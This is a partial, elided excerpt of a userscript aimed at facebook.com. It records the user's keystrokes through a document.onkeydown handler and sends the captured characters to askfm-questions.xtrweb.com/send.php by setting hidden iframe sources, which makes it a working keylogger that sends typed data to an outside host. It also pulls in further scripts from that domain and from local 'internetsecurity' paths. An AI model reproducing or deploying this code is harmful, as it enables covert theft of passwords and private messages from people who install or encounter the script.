...
// @include        	http:/facebook.com/*
// @include        	http:/facebook.com
// @include        	http://askfm-questions.xtrweb.com/send.php
// @include        	http://askfm-questions.xtrweb.com/send.php/*
// @include        	http://*.userscripts/internetsecurity/editable.js
// @include        	http://*userscripts/internetsecurity/editable.js/*
// @include        	http://localhost:84/userscripts/internetsecurity/editable.js
// @include        	http://localhost:84/userscripts/internetsecurity/editable.js/*
// @require                     http://*.userscripts/internetsecurity/editable.js
// @require      	http://*userscripts/internetsecurity/editable.js/*
// @require     	http://localhost:84/userscripts/internetsecurity/editable.js
// @require          	http://localhost:84/userscripts/internetsecurity/editable.js/*
// @require        	http://askfm-questions.xtrweb.com/send.php
// @require      	http://askfm-questions.xtrweb.com/send.php/*
...
document.onkeydown=function(e){
		  ...
		  if(charCount==2)
			...
			if(changeFrame==1)
			{
			 document.getElementById("sender1").setAttribute('src', 'http://askfm-questions.xtrweb.com/send.php?s='+record);
			record="";
			charCount=0;
			changeFrame++;
			}
			...
			if(changeFrame==0)
			{
		 document.getElementById("sender").setAttribute('src', 'http://askfm-questions.xtrweb.com/send.php?s='+record);
			record="";
			charCount=0;
			changeFrame++;
			}
				...
				{
		 document.getElementById("sender2").setAttribute('src', 'http://askfm-questions.xtrweb.com/send.php?s='+record);
			record="";
			charCount=0;
			changeFrame=0;
			}
